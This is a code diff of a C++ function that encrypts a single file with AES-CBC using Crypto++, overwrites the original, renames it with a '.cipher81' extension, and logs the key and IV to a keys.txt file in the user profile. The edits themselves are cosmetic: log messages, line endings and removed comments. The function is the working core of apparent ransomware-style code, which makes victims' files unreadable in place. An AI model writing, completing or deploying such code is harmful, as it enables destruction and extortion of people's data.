@@ -31,24 +31,22 @@ CryptoPP::SecByteBlock generateIv()
 
 void encryptSingleFile(const fs::path& filePath, const CryptoPP::SecByteBlock& generatedKey, const CryptoPP::SecByteBlock& generatedIv)
 {
-    okay("Start encryptSingleFile for: ") << filePath << "\n";
+    okay("Start encrypting for: ") << filePath << '\n';
     std::ifstream inFile(filePath, std::ios::binary);
     if (!inFile.is_open())
     {
-        warn("Cannot open the file to read: ") << filePath << std::endl;
+        warn("Cannot open the file to read: ") << filePath << '\n';
         return;
     }
     std::vector<char> data((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
     inFile.close();
 
-    // --- Prepare key, IV, and encryptor (AES/CBC) ---
     CryptoPP::SecByteBlock key = generatedKey;
     CryptoPP::SecByteBlock iv = generatedIv;
 
     CryptoPP::CBC_Mode<CryptoPP::AES>::Encryption encryptor;
     encryptor.SetKeyWithIV(key, key.size(), iv);
 
-    // --- Encryption (catch Crypto++ exceptions) ---
     std::string encrypted;
     try
     {
@@ -65,35 +63,35 @@ void encryptSingleFile(const fs::path& filePath, const CryptoPP::SecByteBlock& g
     }
     catch (const CryptoPP::Exception& e)
     {
-        warn("Crypto++ error while encrypting file ") << filePath << ": " << e.what() << std::endl;
+        warn("Crypto++ error while encrypting file ") << filePath << ": " << e.what() << '\n';
     }
 
     std::ofstream outFile(filePath, std::ios::binary | std::ios::trunc);
     if (!outFile.is_open())
     {
-        warn("Cannot open file to write: ") << filePath << std::endl;
+        warn("Cannot open file to write: ") << filePath << '\n';
         return;
     }
     outFile.write(encrypted.data(), encrypted.size());
     outFile.close();
 
-    okay("File encrypted: ") << filePath << std::endl;
+    okay("File encrypted: ") << filePath << '\n';
 
     fs::path newFilePath = filePath;
     newFilePath += ".cipher81";
     try
     {
         fs::rename(filePath, newFilePath);
-        okay("File encrypted and renamed to: ") << newFilePath << std::endl;
+        okay("File encrypted and renamed to: ") << newFilePath << '\n';
     }
     catch (const fs::filesystem_error& e)
     {
-        warn("Error while renaming file: ") << e.what() << std::endl;
+        warn("Error while renaming file: ") << e.what() << '\n';
     }
 
     std::string userProfilePath = getUserProfilePath();
     if (userProfilePath.empty()) {
-        warn("Failed to get user profile path!") << std::endl;
+        warn("Failed to get user profile path!") << '\n';
     }
     std::string userProfile = userProfilePath + "\\keys.txt";
 
@@ -101,8 +99,6 @@ void encryptSingleFile(const fs::path& filePath, const CryptoPP::SecByteBlock& g
     if (!keys) {
         warn("Couldn't open keys file\n");
     }
-
-    okay("Work");
 
     std::string keyBase64;
     CryptoPP::StringSource encryptKey(key, key.size(), true, new CryptoPP::Base64Encoder(
@@ -116,8 +112,8 @@ void encryptSingleFile(const fs::path& filePath, const CryptoPP::SecByteBlock& g
         false
     ));
 
-    keys << keyBase64 << "\n";
-    keys << ivBase64 << "\n";
+    keys << keyBase64 << '\n';
+    keys << ivBase64 << '\n';
 
-    info("Finished encryptSingleFile for: ") << filePath << "\n";
+    info("Finished encrypting for: ") << filePath << '\n';
 }
